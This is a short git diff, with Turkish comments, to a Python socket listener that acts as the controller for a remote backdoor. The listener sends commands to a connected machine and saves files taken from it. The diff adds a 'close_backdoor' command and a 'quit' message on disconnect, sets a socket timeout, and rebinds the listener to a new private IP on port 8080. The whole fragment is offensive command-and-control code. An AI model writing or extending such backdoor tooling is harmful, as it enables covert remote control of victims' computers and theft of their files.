@@ -71,6 +71,12 @@ class SocketListener:
             # cd .. aradaki boşluğu anlamlandırmak için 
             command_input = command_input.split(" ")
             if command_input[0] == "quit":
+                
+                self.close_connection()
+                break
+
+            if command_input[0] == "close_backdoor":
+                self.json_send(command_input)
                 self.close_connection()
                 break
 
@@ -84,13 +90,14 @@ class SocketListener:
                 command_output = self.save_file(command_input[1],command_output)
 
             print(command_output)
+            self.my_connection.settimeout(10) # 10 saniye bekler
 
     def close_connection(self):
+        self.json_send("quit")
         self.conn.close()
         self.my_connection.close()
         print("Connections are closed.")
 
-    
-
-my_socket_listener = SocketListener("192.168.1.115", 8080)
+my_socket_listener = SocketListener("192.168.20.177", 8080)
 my_socket_listener.start_listener() 
+
